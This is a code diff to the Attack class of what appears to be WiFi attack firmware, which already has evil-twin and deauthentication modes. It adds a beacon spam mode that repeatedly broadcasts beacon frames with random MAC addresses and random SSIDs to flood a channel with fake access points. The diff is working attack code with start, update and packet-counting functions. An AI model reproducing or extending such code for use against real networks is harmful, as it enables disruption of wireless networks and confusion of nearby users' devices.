@@ -89,6 +89,8 @@ void Attack::stop() {
         probe.active         = false;
         evilTwin             = false;
         trueDeauth           = false;
+        beaconSpam           = false;
+        beaconSpamPkts       = 0;
         prntln(A_STOP);
     }
 }
@@ -188,6 +190,7 @@ void Attack::update() {
     
     if (evilTwin) evilTwinUpdate();
     if (trueDeauth) trueDeauthUpdate();
+    if (beaconSpam) beaconSpamUpdate();
 
     if (currentTime - attackTime > 1000) {
         attackTime = currentTime;
@@ -539,4 +542,53 @@ void Attack::trueDeauthUpdate() {
         }
         deauth.time = currentTime;
     }
+}
+
+void Attack::startBeaconSpam(int apCount, uint8_t ch) {
+    stop();
+    running = true;
+    beaconSpam = true;
+    beaconSpamCount = apCount;
+    wifi_channel = ch;
+    beaconSpamPkts = 0;
+    attackStartTime = currentTime;
+    
+    if (output) {
+        prntln("Starting Beacon Spam...");
+        prnt("Sending ");
+        prnt(apCount);
+        prntln(" fake APs");
+    }
+}
+
+void Attack::beaconSpamUpdate() {
+    if (!beaconSpam) return;
+    
+    if (beaconSpamPkts == 0 || currentTime - beacon.time >= 1) {
+        uint8_t fakeMac[6];
+        char ssid[33];
+        
+        for (int i = 0; i < beaconSpamCount; i++) {
+            getRandomMac(fakeMac);
+            
+            int ssidLen = random(8, 33);
+            for (int j = 0; j < ssidLen; j++) {
+                ssid[j] = random(32, 127);
+            }
+            ssid[ssidLen] = '\0';
+            
+            sendBeacon(fakeMac, ssid, wifi_channel, random(0, 2) == 1);
+        }
+        
+        beacon.time = currentTime;
+        beaconSpamPkts += beaconSpamCount;
+    }
+}
+
+bool Attack::isBeaconSpamRunning() {
+    return beaconSpam;
+}
+
+uint32_t Attack::getBeaconSpamPkts() {
+    return beaconSpamPkts;
 }
